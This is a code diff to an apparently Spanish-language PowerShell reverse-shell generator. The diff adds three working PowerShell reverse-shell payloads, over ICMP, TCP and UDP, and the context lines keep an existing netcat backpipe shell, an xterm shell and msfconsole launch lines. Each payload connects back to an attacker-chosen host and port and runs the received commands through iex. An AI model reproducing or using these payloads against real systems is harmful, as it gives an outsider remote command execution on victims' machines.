@@ -1,5 +1,5 @@
 ﻿param(
-[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$netcat,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit
+[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$netcat,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit,[switch]$PowershellICMP,[switch]$PowershellTCP,[switch]$PowershellUDP
 
 )
 
@@ -240,7 +240,7 @@ break
 
 }
 
-if ($netcat -eq $false -and $python -eq $false -and $python3 -eq $false -and $bash -eq $false -and $perl -eq $false -and $php -eq $false -and $ruby -eq $false -and $java -eq $false) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Debes seleccionar el lenguaje de la shell `n`n" -ForegroundColor red; break }
+if ($netcat -eq $false -and $python -eq $false -and $python3 -eq $false -and $bash -eq $false -and $perl -eq $false -and $php -eq $false -and $ruby -eq $false -and $java -eq $false -and $PowershellICMP -eq $false -and $PowershellTCP -eq $false -and $PowershellUDP -eq $false) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Debes seleccionar el lenguaje de la shell `n`n" -ForegroundColor red; break }
 
 $r_netcat = @"
 mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc $Lhost $Lport 1>/tmp/backpipe
@@ -268,6 +268,18 @@ p.waitFor()"@
 $r_xterm = @"
 xterm -display $Lhost":"$Lport
 "@
+$r_PowershellICMP = @"
+`$ip='$LHOST'; `$ic=New-Object System.Net.NetworkInformation.Ping; `$po=New-Object System.Net.NetworkInformation.PingOptions; `$po.DontFragment=`$true; function f(`$b) { `$ic.Send(`$ip,60000,([text.encoding]::ASCII).GetBytes(`$b),`$po) }; `$p = -join('PS ',(gl).path,'> '); f(`$p); while (`$true) { `$r = f(''); if (!`$r.Buffer) { continue }; `$rs=([text.encoding]::ASCII).GetString(`$r.Buffer); if (`$rs.StartsWith('EXIT')) { exit }; if (`$rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('C:\Temp\z',`$rs.Substring(7)); f('.'); } else { try { `$rt=(iex -Command `$rs | Out-String); } catch { f(`$_) }; `$i=0; while (`$i -lt `$rt.length-120) { f(`$rt.Substring(`$i,120)); `$i -= -120; }; f(`$rt.Substring(`$i)); `$p = -join('PS ',(gl).path,'> '); f(`$p); }; }
+"@
+
+$r_PowershellTCP = @"
+`$c = New-Object System.Net.Sockets.TCPClient('$Lhost',$Lport);`$str = `$c.GetStream();[byte[]]`$b = 0..65535|%{0};while((`$i = `$str.Read(`$b, 0, `$b.Length)) -ne 0){;`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0, `$i);`$sendback = (iex `$d 2>&1 | Out-String );`$sendback2  = `$sendback + 'PS ' + (pwd).Path + '> ';`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$str.Write(`$sb,0,`$sb.Length);`$str.Flush()};`$c.Close()
+"@
+
+$r_PowershellUDP = @"
+`$end = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("$Lhost"),$Lport);`$c = New-Object System.Net.Sockets.UDPClient(53);[byte[]]`$bytes = 0..65535|%{0};`$sb = ([text.encoding]::ASCII).GetBytes('PS> ');`$c.Send(`$sb,`$sb.Length,`$end);while(`$true){;`$receivebytes = `$c.Receive([ref]`$end);`$returndata = ([text.encoding]::ASCII).GetString(`$receivebytes);`$sendback = (iex `$returndata 2>&1 | Out-String );`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback);`$c.Send(`$sb,`$sb.Length,`$end)};`$c.Close()
+"@
+
 
 
 if ($web -eq $true) {
@@ -322,6 +334,9 @@ if ($php -eq $true) {write-host $r_php  "`n"}
 if ($ruby -eq $true) {write-host $r_ruby "`n"}
 if ($java -eq $true) {write-host $r_java "`n"}
 if ($xterm -eq $true) {write-host $r_xterm "`n"}
+if ($PowershellICMP -eq $true) {write-host $r_PowershellICMP "`n"}
+if ($PowershellTCP -eq $true) {write-host $r_PowershellTCP "`n"}
+if ($PowershellUDP -eq $true) {write-host $r_PowershellUDP "`n"}
 
 ################################################################################ Spawn tty shell ################################################################################
 
@@ -342,9 +357,11 @@ if ($php -eq $true -and $metasploit -eq $true) {$metasploit_php | Out-File -Enco
 if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 if ($netcat -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($PowershellICMP -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellICMP (proximas updates...) `n" }
+if ($PowershellTCP -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellTCP (proximas updates...)`n" }
+if ($Powershelludp -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellUDP (proximas updates...)`n" }
 
 }
-
 
 
 
